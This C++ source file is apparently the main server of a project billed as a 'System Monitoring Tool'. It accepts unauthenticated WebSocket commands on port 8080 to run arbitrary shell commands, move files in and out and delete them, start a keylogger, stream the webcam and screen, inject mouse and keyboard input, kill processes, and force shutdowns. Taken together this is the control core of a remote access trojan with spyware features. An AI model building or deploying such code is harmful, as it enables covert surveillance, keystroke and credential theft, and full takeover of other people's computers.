/*
 * cpp-websocket - System Monitoring Tool
 * Copyright (C) 2025 pnthuc and contributors
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

#include "global.h"
#include "screenshot.h"
#include "keylogger.h"
#include "list_app.h"
#include "camera.h"
#include "restart.h"
#include "shutdown.h"
#include "screen.h"
#include "list_proc.h"
#include "terminal.h"
#include "announce.h"
#include "control.h" 
#include "systeminfo.h"
#include "file_explorer.h"

void DisableQuickEdit() {
    HANDLE hInput = GetStdHandle(STD_INPUT_HANDLE);
    if (hInput == INVALID_HANDLE_VALUE) return;

    DWORD prev_mode;
    if (!GetConsoleMode(hInput, &prev_mode)) return;

    // Tắt QuickEdit và Insert Mode, giữ lại các cờ khác
    prev_mode &= ~ENABLE_QUICK_EDIT_MODE;
    prev_mode &= ~ENABLE_INSERT_MODE;
    prev_mode |= ENABLE_EXTENDED_FLAGS;

    SetConsoleMode(hInput, prev_mode);
}

void session(tcp::socket socket) {
    auto sysMonitor = std::make_shared<SystemMonitor>();
    try {
        auto ws_ptr = std::make_shared<websocket::stream<tcp::socket>>(std::move(socket));
        ws_ptr->accept();
        sendMsg(*ws_ptr, "text", "PATH", std::filesystem::current_path().string());

        std::thread statsThread([ws_ptr, sysMonitor]() {
            try {
                while (true) { 
                    double cpu = sysMonitor->getCpuUsage();
                    auto ram = sysMonitor->getRamUsage();
                    std::string uptime = sysMonitor->getSystemUptime();

                    std::string jsonMsg = "{\"cpu\":" + std::to_string(cpu) + 
                                        ",\"ram_percent\":" + std::to_string(ram.percent) + 
                                        ",\"ram_used_gb\":" + std::to_string(ram.usedGB) + 
                                        ",\"ram_total_gb\":" + std::to_string(ram.totalGB) + 
                                        ",\"uptime\":\"" + uptime + "\"}";

                    sendMsg(*ws_ptr, "sysinfo", "SYS", jsonMsg);

                    std::this_thread::sleep_for(std::chrono::seconds(1));
                }
            } catch (...) {}
        });
        statsThread.detach();

        for (;;) {
            beast::flat_buffer buffer;
            ws_ptr->read(buffer);
            std::string msg = beast::buffers_to_string(buffer.data());
            file_logger->info("Received: {}", msg);
            json data = json::parse(msg);
            if (data.contains("terminal")) {
                std::string command = data["terminal"];
                std::string path = data["path"];
                executeCommand(command, path, *ws_ptr);
                continue;
            }
            if (data["command"] == "mouse_move") {
                if (data.contains("x") && data.contains("y")) {
                    double x = data["x"];
                    double y = data["y"];
                    MoveMouse(x, y);
                }
            }
            else if (data["command"] == "mouse_click") {
                if (data.contains("btn") && data.contains("action")) {
                    ClickMouse(data["btn"], data["action"]);
                }
            }
            else if (data["command"] == "key_event") {
                if (data.contains("key") && data.contains("action")) {
                    PressKey(data["key"], data["action"]);
                }
            }
            else if (data["command"] == "list_directory") {
                std::string path = data.contains("path") ? data["path"] : "C:\\";
                std::cerr << "Listing directory: " << path << std::endl;
                handle_list_directory(ws_ptr, path);
            }
            else if (data["command"] == "delete_file") {
                if (data.contains("path")) {
                    handle_delete_file(data["path"]);
                    sendMsg(*ws_ptr, "text", "Info", "Deleted: " + std::string(data["path"]));
                }
            }
            else if (data["command"] == "download_file") {
                if (data.contains("path")) {
                    sendMsg(*ws_ptr, "text", "Info", "Downloading file...");
                    handle_download_file(ws_ptr, data["path"]);
                }
            }
            else if (data["command"] == "upload_file") {
                if (data.contains("path") && data.contains("filename") && data.contains("data")) {
                    handle_upload_file(data["path"], data["filename"], data["data"]);
                    sendMsg(*ws_ptr, "text", "Info", "File uploaded successfully.");
                    // Refresh thư mục sau khi upload
                    handle_list_directory(ws_ptr, data["path"]);
                }
            }
            else if (data["command"] == "screenshot") {
                sendMsg(*ws_ptr, "text", "Info", "Capturing screenshot...");
                captureScreenshot(*ws_ptr);
                std::cerr << "Capturing screenshot..." << std::endl;
            }
            else if (data["command"] == "processes") {
                sendMsg(*ws_ptr, "text", "Info", "Listing running processes...");
                list_processes(*ws_ptr);
                std::cerr << "Listing running processes..." << std::endl;
            }
            else if (data["command"] == "applications") {
                sendMsg(*ws_ptr, "text", "Info", "Listing running applications...");
                list_applications(*ws_ptr);
                std::cerr << "Listing running applications..." << std::endl;
            }
            else if (data["command"] == "start_keylogger") {
                sendMsg(*ws_ptr, "text", "Info", "Keylogger started.");
                key_log_start(ws_ptr);  
                std::cerr << "Keylogger started." << std::endl;
            }
            else if (data["command"] == "stop_keylogger") {
                key_log_stop();
                sendMsg(*ws_ptr, "text", "Info", "Keylogger stopped.");
                std::cerr << "Keylogger stopped." << std::endl;
            }
            else if (data["command"] == "shutdown") {   
                sendMsg(*ws_ptr, "text", "Info", "Shutting down the system...");
                system("shutdown /s /t 0 /f");
                std::cerr << "Shutting down the system..." << std::endl;
            }
            else if (data["command"] == "restart") {
                sendMsg(*ws_ptr, "text", "Info", "Restarting the system...");
                system("shutdown /r /t 0 /f");
                std::cerr << "Restarting the system..." << std::endl;
            }
            else if (data["command"] == "start_camera") {
                sendMsg(*ws_ptr, "text", "Info", "Camera started.");
                startCamera(ws_ptr);
                sendMsg(*ws_ptr, "text", "Info", "Showing video...");
                std::cerr << "Camera started." << std::endl;
            }
            else if (data["command"] == "stop_camera") {
                stopCamera();
                sendMsg(*ws_ptr, "text", "Info", "Camera stopped.");
                std::cerr << "Camera stopped." << std::endl;
            }
            else if (data["command"] == "start_screen") {
                sendMsg(*ws_ptr, "text", "Info", "Screen recording started.");
                startScreen(ws_ptr);
                sendMsg(*ws_ptr, "text", "Info", "Recording screen...");
                std::cerr << "Screen recording started." << std::endl;
            }
            else if (data["command"] == "stop_screen") {
                sendMsg(*ws_ptr, "text", "Info", "Screen recording stopped.");
                stopScreen();
                std::cerr << "Screen recording stopped." << std::endl;
            }
            else if (data["command"] == "start_application") {
                if (data.contains("name")) {
                    std::string appName = data["name"];
                    sendMsg(*ws_ptr, "text", "Info", "Starting app: " + appName);
                    start_application_exec(appName);
                    std::cerr << "Starting application: " << appName << std::endl;
                }
            }
            else if (data["command"] == "stop_application") {
                if (data.contains("exe_name")) {
                    std::string exeName = data["exe_name"];
                    stop_application_by_name(exeName, *ws_ptr);
                    std::cerr << "Stopping application: " << exeName << std::endl;
                }
            }
            else if (data["command"] == "stop_process") {
                if (data.contains("pid")) {
                    DWORD pid = data["pid"];
                    stop_application_exec(pid, *ws_ptr);
                    std::cerr << "Stopping process PID: " << pid << std::endl;
                }
            }
            else {
                sendMsg(*ws_ptr, "text", "Info", "Unknown command: " + msg);
            }
        }
    }
    catch (std::exception& e) {
        file_logger->error("Session error: {}", e.what());
        std::cerr << "Session error: " << e.what() << std::endl;
        key_log_stop();
        stopCamera();
        stopScreen();
    } catch (...) {
        file_logger->error("Session unknown error");
        std::cerr << "Session error: unknown error" << std::endl;
        key_log_stop();
        stopCamera();
        stopScreen();
    }
}

int main() {

    DisableQuickEdit();
     std::cout.setf(std::ios::unitbuf);

    try {
        net::io_context ioc;
        tcp::acceptor acceptor(ioc, {tcp::v4(), 8080});
        spdlog::flush_on(spdlog::level::info);
        file_logger->info("Server running at ws://localhost:8080");
        std::cout << "Server running at ws://localhost:8080" << std::endl;
        std::thread(announce_once).detach();

        for (;;) {
            tcp::socket socket(ioc);
            acceptor.accept(socket);
            std::thread([s = std::move(socket)]() mutable {
                session(std::move(s));
            }).detach();
        }

    } catch (std::exception& e) {
        file_logger->error("Error: {}", e.what());
        std::cerr << "Error: " << e.what() << std::endl;
    }
}